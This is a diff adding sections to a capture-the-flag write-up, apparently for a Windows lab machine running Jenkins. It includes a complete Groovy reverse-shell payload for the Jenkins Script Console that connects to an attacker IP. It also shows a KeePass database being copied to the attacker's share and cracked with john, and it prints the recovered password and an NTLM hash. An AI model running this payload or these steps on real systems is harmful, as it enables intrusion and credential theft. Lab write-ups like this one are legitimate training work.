@@ -84,19 +84,22 @@ Finished
 
 ```
 
-
----
-## jenkins 
+## Jenkins RCE: 
 
 ![](./screens/1.png)
 
 ### Vulnerability
 
-Description of the vulnerability exploited.
+- Once access to Jenkins is gained, the Script Console provides a direct path to command execution on the underlying server.
+- The console executes arbitrary Groovy scripts within the Jenkins runtime, functioning similarly to a web shell.
 
 ### Exploitation
 
+the following powershell payload is written directly into the script console at the /script endpoint, providing a reverse shell:
 
+```Groovy
+String host="10.10.15.80"; int port=9001; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
 
 ---
 ## User Flag
@@ -194,6 +197,8 @@ e3232272596fb47950d59c4cf1e7066a
 
 ## Privilege escalation
 
+Enumerating kohsuke Documents directory discloses a KeePass password database.
+
 ## KeePass Enumeration
 
 ```
@@ -203,12 +208,16 @@ C:\Users\kohsuke\Documents\CEH.kdbx
 
 ```
 
+The file is copied to the kali host:
+
 ```
 C:\Users\kohsuke\Documents>copy CEH.kdbx \\10.10.15.80\share\CEH.kdbx
 copy CEH.kdbx \\10.10.15.80\share\CEH.kdbx
         1 file(s) copied.
 
 ```
+
+Converting the file into a crackable hash:
 
 ```
  keepass2john CEH.kdbx
@@ -218,6 +227,8 @@ CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c7
 └─$ nano CEH.hash
 
 ```
+
+Cracking the hash:
 
 ```
 john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash
@@ -235,7 +246,7 @@ Session completed.
                           
 ```
 
-!
+the master password is now recovered: `moonshine1`
 ### Enumeration
 
 aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
